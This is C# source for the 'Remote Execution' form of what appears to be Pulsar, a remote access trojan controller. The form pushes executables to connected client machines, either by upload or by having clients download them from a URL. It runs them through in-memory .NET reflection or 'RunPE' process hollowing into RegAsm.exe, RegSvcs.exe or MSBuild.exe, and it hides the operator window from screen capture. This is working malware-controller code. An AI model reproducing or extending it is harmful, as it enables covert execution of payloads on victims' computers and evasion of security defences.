using Pulsar.Common.Enums;
using Pulsar.Common.Messages;
using Pulsar.Server.Forms.DarkMode;
using Pulsar.Server.Helper;
using Pulsar.Server.Messages;
using Pulsar.Server.Models;
using Pulsar.Server.Networking;
using System;
using System.Collections.Generic;
using System.IO;
using System.Windows.Forms;

namespace Pulsar.Server.Forms
{
    public partial class FrmRemoteExecution : Form
    {
        private class RemoteExecutionMessageHandler
        {
            public FileManagerHandler FileHandler;
            public TaskManagerHandler TaskHandler;
        }

        /// <summary>
        /// The clients which can be used for the remote execution.
        /// </summary>
        private readonly Client[] _clients;

        private readonly List<RemoteExecutionMessageHandler> _remoteExecutionMessageHandlers;

        private enum TransferColumn
        {
            Client,
            Status
        }

        private bool _isUpdate;
        private bool _executeInMemoryDotNet;
        private bool _useRunPE;
        private string _runPETarget;
        private string _runPECustomPath;

        public FrmRemoteExecution(Client[] clients, bool Updating = false)
        {
            _clients = clients;
            _remoteExecutionMessageHandlers = new List<RemoteExecutionMessageHandler>(clients.Length);

            InitializeComponent();

            chkUpdate.Checked = Updating;

            cmbRunPETarget.SelectedIndex = 0;

            DarkModeManager.ApplyDarkMode(this);
			ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);

            foreach (var client in clients)
            {
                var remoteExecutionMessageHandler = new RemoteExecutionMessageHandler
                {
                    FileHandler = new FileManagerHandler(client),
                    TaskHandler = new TaskManagerHandler(client)
                };

                var lvi = new ListViewItem(new[]
                {
                    $"{client.Value.Username}@{client.Value.PcName} [{client.EndPoint.Address}:{client.EndPoint.Port}]",
                    "Waiting..."
                })
                { Tag = remoteExecutionMessageHandler };

                lstTransfers.Items.Add(lvi);
                _remoteExecutionMessageHandlers.Add(remoteExecutionMessageHandler);
                RegisterMessageHandler(remoteExecutionMessageHandler);
            }
        }

        /// <summary>
        /// Registers the message handlers for client communication.
        /// </summary>
        private void RegisterMessageHandler(RemoteExecutionMessageHandler remoteExecutionMessageHandler)
        {
            // TODO handle disconnects
            remoteExecutionMessageHandler.TaskHandler.ProcessActionPerformed += ProcessActionPerformed;
            remoteExecutionMessageHandler.FileHandler.ProgressChanged += SetStatusMessage;
            remoteExecutionMessageHandler.FileHandler.FileTransferUpdated += FileTransferUpdated;
            MessageHandler.Register(remoteExecutionMessageHandler.FileHandler);
            MessageHandler.Register(remoteExecutionMessageHandler.TaskHandler);
        }

        /// <summary>
        /// Unregisters the message handlers.
        /// </summary>
        private void UnregisterMessageHandler(RemoteExecutionMessageHandler remoteExecutionMessageHandler)
        {
            MessageHandler.Unregister(remoteExecutionMessageHandler.TaskHandler);
            MessageHandler.Unregister(remoteExecutionMessageHandler.FileHandler);
            remoteExecutionMessageHandler.FileHandler.ProgressChanged -= SetStatusMessage;
            remoteExecutionMessageHandler.FileHandler.FileTransferUpdated -= FileTransferUpdated;
            remoteExecutionMessageHandler.TaskHandler.ProcessActionPerformed -= ProcessActionPerformed;
        }

        private void FrmRemoteExecution_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("Remote Execution", _clients.Length);
        }

        private void FrmRemoteExecution_FormClosing(object sender, FormClosingEventArgs e)
        {
            foreach (var handler in _remoteExecutionMessageHandlers)
            {
                UnregisterMessageHandler(handler);
                handler.FileHandler.Dispose();
            }

            _remoteExecutionMessageHandlers.Clear();
            lstTransfers.Items.Clear();
        }

        private void btnExecute_Click(object sender, EventArgs e)
        {
            _isUpdate = chkUpdate.Checked;
            _executeInMemoryDotNet = chkBoxReflectionExecute.Checked;
            _useRunPE = chkRunPE.Checked;

            if (_useRunPE)
            {
                switch (cmbRunPETarget.SelectedIndex)
                {
                    case 0: _runPETarget = "a"; break; // RegAsm.exe
                    case 1: _runPETarget = "b"; break; // RegSvcs.exe
                    case 2: _runPETarget = "c"; break; // MSBuild.exe
                    case 3: 
                        _runPETarget = "d"; // Custom Path
                        _runPECustomPath = txtRunPECustomPath.Text;
                        if (string.IsNullOrWhiteSpace(_runPECustomPath))
                        {
                            MessageBox.Show("Please specify a custom path for RunPE.", "RunPE Custom Path Required", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                            return;
                        }
                        break;
                    default: _runPETarget = "a"; break;
                }
            }

            if (radioURL.Checked)
            {
                foreach (var handler in _remoteExecutionMessageHandlers)
                {
                    if (!txtURL.Text.StartsWith("http"))
                        txtURL.Text = "http://" + txtURL.Text;

                    handler.TaskHandler.StartProcessFromWeb(txtURL.Text, _isUpdate, _executeInMemoryDotNet, _useRunPE, _runPETarget, _runPECustomPath);
                }
            }
            else
            {
                foreach (var handler in _remoteExecutionMessageHandlers)
                {
                    handler.FileHandler.BeginUploadFile(txtPath.Text, "");
                }
            }
        }

        private void btnBrowse_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Multiselect = false;
                ofd.Filter = "Executable and Batch Files (*.exe;*.bat)|*.exe;*.bat";
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    txtPath.Text = Path.Combine(ofd.InitialDirectory, ofd.FileName);
                }
            }
        }

        private void radioLocalFile_CheckedChanged(object sender, EventArgs e)
        {
            groupLocalFile.Enabled = radioLocalFile.Checked;
            groupURL.Enabled = !radioLocalFile.Checked;
        }

        private void radioURL_CheckedChanged(object sender, EventArgs e)
        {
            groupLocalFile.Enabled = !radioURL.Checked;
            groupURL.Enabled = radioURL.Checked;
        }

        /// <summary>
        /// Called whenever a file transfer gets updated.
        /// </summary>
        /// <param name="sender">The message processor which raised the event.</param>
        /// <param name="transfer">The updated file transfer.</param>
        private void FileTransferUpdated(object sender, FileTransfer transfer)
        {
            for (var i = 0; i < lstTransfers.Items.Count; i++)
            {
                var handler = (RemoteExecutionMessageHandler)lstTransfers.Items[i].Tag;

                if (handler.FileHandler.Equals(sender as FileManagerHandler) || handler.TaskHandler.Equals(sender as TaskManagerHandler))
                {
                    lstTransfers.Items[i].SubItems[(int)TransferColumn.Status].Text = transfer.Status;

                    if (transfer.Status == "Completed")
                    {
                        var pathToStart = transfer.Type == Enums.TransferType.Upload ? transfer.LocalPath : transfer.RemotePath;
                        handler.TaskHandler.StartProcess(pathToStart, _isUpdate, _executeInMemoryDotNet, _useRunPE, _runPETarget, _runPECustomPath);
                    }
                    return;
                }
            }
        }

        // TODO: update documentation
        /// <summary>
        /// Sets the status of the file manager.
        /// </summary>
        /// <param name="sender">The message handler which raised the event.</param>
        /// <param name="message">The new status.</param>
        private void SetStatusMessage(object sender, string message)
        {
            for (var i = 0; i < lstTransfers.Items.Count; i++)
            {
                var handler = (RemoteExecutionMessageHandler)lstTransfers.Items[i].Tag;

                if (handler.FileHandler.Equals(sender as FileManagerHandler) || handler.TaskHandler.Equals(sender as TaskManagerHandler))
                {
                    lstTransfers.Items[i].SubItems[(int)TransferColumn.Status].Text = message;
                    return;
                }
            }
        }

        private void ProcessActionPerformed(object sender, ProcessAction action, bool result)
        {
            if (action != ProcessAction.Start) return;

            for (var i = 0; i < lstTransfers.Items.Count; i++)
            {
                var handler = (RemoteExecutionMessageHandler)lstTransfers.Items[i].Tag;

                if (handler.FileHandler.Equals(sender as FileManagerHandler) || handler.TaskHandler.Equals(sender as TaskManagerHandler))
                {
                    lstTransfers.Items[i].SubItems[(int)TransferColumn.Status].Text = result ? "Successfully started process" : "Failed to start process";
                    return;
                }
            }
        }

        private void chkBoxReflectionExecute_CheckedChanged(object sender, EventArgs e)
        {
            if (chkBoxReflectionExecute.Checked)
            {
                chkRunPE.Checked = false;
                chkUpdate.Checked = false;
            }
        }

        private void chkUpdate_CheckedChanged(object sender, EventArgs e)
        {
            if (chkUpdate.Checked)
            {
                chkBoxReflectionExecute.Checked = false;
                chkRunPE.Checked = false;
            }
        }

        private void chkRunPE_CheckedChanged(object sender, EventArgs e)
        {
            if (chkRunPE.Checked)
            {
                chkBoxReflectionExecute.Checked = false;
                chkUpdate.Checked = false;
                cmbRunPETarget.Enabled = true;
            }
            else
            {
                cmbRunPETarget.Enabled = false;
                txtRunPECustomPath.Visible = false;
                txtRunPECustomPath.Enabled = false;
                btnBrowseRunPE.Visible = false;
                btnBrowseRunPE.Enabled = false;
            }
        }

        private void cmbRunPETarget_SelectedIndexChanged(object sender, EventArgs e)
        {
            bool isCustomPath = cmbRunPETarget.SelectedIndex == 3;
            txtRunPECustomPath.Visible = isCustomPath;
            txtRunPECustomPath.Enabled = isCustomPath;
            btnBrowseRunPE.Visible = isCustomPath;
            btnBrowseRunPE.Enabled = isCustomPath;
        }

        private void btnBrowseRunPE_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Multiselect = false;
                ofd.Filter = "Executable Files (*.exe)|*.exe|All Files (*.*)|*.*";
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    txtRunPECustomPath.Text = ofd.FileName;
                }
            }
        }
    }
}
